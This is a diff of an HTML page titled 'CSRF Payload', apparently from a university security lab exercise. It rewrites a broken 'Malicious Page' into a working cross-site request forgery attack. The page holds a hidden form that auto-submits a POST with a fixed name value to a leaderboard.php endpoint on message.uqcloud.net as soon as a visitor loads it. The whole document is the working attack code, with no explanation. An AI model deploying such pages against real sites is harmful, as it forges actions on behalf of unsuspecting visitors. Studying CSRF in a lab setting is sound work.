@@ -1,12 +1,21 @@
 <!DOCTYPE html>
-<!-- Malicious Page -->
- <html>
-     <body>
-         <formaction="https://message.uqcloud.net/leaderboard.php" method="POST">
-             <input type="hidden" name="name" value="45877481" />
-         </form>
-         <script>
-             document.forms[0].submit();
-         </script>
-     </body>
- </html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>CSRF Payload</title>
+</head>
+<body>
+
+<form id="csrfForm" action="https://message.uqcloud.net/leaderboard.php" method="POST">
+    <input type="hidden" name="name" value="45877481">
+</form>
+
+<script>
+// Automatically submit the form when the page loads
+window.onload = function() {
+    document.getElementById('csrfForm').submit();
+};
+</script>
+
+</body>
+</html>
